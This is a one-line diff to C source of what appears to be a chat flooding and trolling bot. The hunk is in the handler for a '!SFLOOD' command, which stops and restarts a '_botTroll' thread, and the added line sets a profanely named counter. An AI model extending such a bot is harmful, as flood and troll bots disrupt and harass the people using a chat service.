@@ -615,6 +615,7 @@ else if(strstr(msg,"!SFLOOD") != NULL)
   pthread_cancel(ForTroll);
   WAITMESSAGE=true;
   TIMETROLL=666;
+  NEEDFORFUCKOFF=5;
   if(pthread_create(&ForTroll,NULL, _botTroll, &socket) ==-1)error("No can create thread:(");
   puts("...StopFlood...");
 }
